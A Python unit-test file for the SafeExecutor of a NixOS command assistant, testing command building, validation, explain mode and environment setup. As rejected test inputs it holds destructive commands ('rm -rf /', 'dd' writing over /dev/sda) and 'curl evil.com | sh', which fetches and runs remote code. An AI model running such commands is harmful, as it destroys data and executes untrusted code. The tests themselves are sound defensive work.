#!/usr/bin/env python3
"""
Unit tests for the SafeExecutor component
"""

import unittest
from unittest.mock import patch, MagicMock, Mock
import subprocess
from pathlib import Path

# Add the src directory to Python path
import sys
sys.path.insert(0, str(Path(__file__).parent.parent.parent / 'src'))

from luminous_nix.core.executor import SafeExecutor
from luminous_nix.core.interface import ExecutionMode
from luminous_nix.core.intents import Command


class TestSafeExecutor(unittest.TestCase):
    """Test the SafeExecutor component"""
    
    def setUp(self):
        """Create execution engine for testing"""
        self.engine = SafeExecutor(dry_run=True)
        
    def test_build_command_install(self):
        """Test building install command"""
        cmd = self.engine.build_command('install', 'firefox')
        
        self.assertIsNotNone(cmd)
        self.assertEqual(cmd.program, 'nix')
        self.assertEqual(cmd.args, ['profile', 'install', 'nixpkgs#firefox'])
        self.assertTrue(cmd.safe)
        self.assertFalse(cmd.requires_sudo)
        self.assertEqual(cmd.description, 'Install firefox')
        
    def test_build_command_remove(self):
        """Test building remove command"""
        cmd = self.engine.build_command('remove', 'firefox')
        
        self.assertIsNotNone(cmd)
        self.assertEqual(cmd.program, 'nix')
        self.assertEqual(cmd.args, ['profile', 'remove', 'firefox'])
        self.assertTrue(cmd.safe)
        self.assertFalse(cmd.requires_sudo)
        
    def test_build_command_update(self):
        """Test building update command"""
        cmd = self.engine.build_command('update')
        
        self.assertIsNotNone(cmd)
        self.assertEqual(cmd.program, 'nixos-rebuild')
        self.assertEqual(cmd.args, ['switch'])
        self.assertTrue(cmd.safe)
        self.assertTrue(cmd.requires_sudo)
        
    def test_build_command_unknown(self):
        """Test handling unknown command"""
        cmd = self.engine.build_command('unknown_action')
        self.assertIsNone(cmd)
        
    def test_validate_command_safe(self):
        """Test validation of safe commands"""
        cmd = Command(
            program='nix',
            args=['profile', 'install', 'firefox'],
            safe=True,
            requires_sudo=False,
            description='Test'
        )
        
        with patch.object(self.engine, '_command_exists', return_value=True):
            valid, error = self.engine.validate_command(cmd)
            
        self.assertTrue(valid)
        self.assertIsNone(error)
        
    def test_validate_command_unsafe(self):
        """Test validation rejects unsafe commands"""
        cmd = Command(
            program='rm',
            args=['-rf', '/'],
            safe=False,
            requires_sudo=True,
            description='Dangerous!'
        )
        
        valid, error = self.engine.validate_command(cmd)
        
        self.assertFalse(valid)
        self.assertIn('not marked as safe', error)
        
    def test_validate_command_dangerous_patterns(self):
        """Test detection of dangerous patterns"""
        dangerous_commands = [
            Command('rm', ['-rf', '/home'], True, False, 'Bad'),
            Command('dd', ['if=/dev/zero', 'of=/dev/sda'], True, True, 'Bad'),
            Command('curl', ['evil.com', '|', 'sh'], True, False, 'Bad'),
        ]
        
        for cmd in dangerous_commands:
            with patch.object(self.engine, '_command_exists', return_value=True):
                valid, error = self.engine.validate_command(cmd)
                
            self.assertFalse(valid, f"Command should be invalid: {cmd}")
            self.assertIn('Dangerous pattern', error)
            
    def test_validate_command_not_exists(self):
        """Test validation when command doesn't exist"""
        cmd = Command(
            program='nonexistent_command',
            args=['test'],
            safe=True,
            requires_sudo=False,
            description='Test'
        )
        
        with patch.object(self.engine, '_command_exists', return_value=False):
            valid, error = self.engine.validate_command(cmd)
            
        self.assertFalse(valid)
        self.assertIn('Command not found', error)
        
    def test_execute_explain_mode(self):
        """Test explain mode doesn't execute"""
        cmd = Command(
            program='nix',
            args=['profile', 'install', 'firefox'],
            safe=True,
            requires_sudo=False,
            description='Install firefox'
        )
        
        with patch.object(self.engine, '_command_exists', return_value=True):
            result = self.engine.execute(cmd.EXPLAIN)
            
        self.assertTrue(result['success'])
        self.assertIn('explanation', result)
        self.assertIn('command', result)
        self.assertFalse(result['would_execute'])
        
    def test_get_safe_env(self):
        """Test safe environment generation"""
        env = self.engine._get_safe_env()
        
        # Check required variables
        self.assertIn('PATH', env)
        self.assertIn('HOME', env)
        self.assertIn('USER', env)
        self.assertIn('LANG', env)
        
        # Check PATH includes nix directories
        self.assertIn('/nix/var/nix/profiles', env['PATH'])
        
    def test_explain_command(self):
        """Test command explanation"""
        test_cases = [
            (Command('nix', ['profile', 'install', 'pkg'], True, False, 'Test'),
             'install the package'),
            (Command('nix', ['profile', 'remove', 'pkg'], True, False, 'Test'),
             'remove the package'),
            (Command('nixos-rebuild', ['switch'], True, True, 'Test'),
             'rebuild and switch'),
            (Command('nix', ['search', 'term'], True, False, 'Test'),
             'search for packages'),
        ]
        
        for cmd, expected_phrase in test_cases:
            explanation = self.engine._explain_command(cmd)
            self.assertIn(expected_phrase.lower(), explanation.lower())
            
    def test_command_exists(self):
        """Test command existence check"""
        # Test with a command that should exist
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            exists = self.engine._command_exists('echo')
            self.assertTrue(exists)
            
        # Test with a command that shouldn't exist
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=1)
            exists = self.engine._command_exists('nonexistent_command_xyz')
            self.assertFalse(exists)


if __name__ == '__main__':
    unittest.main()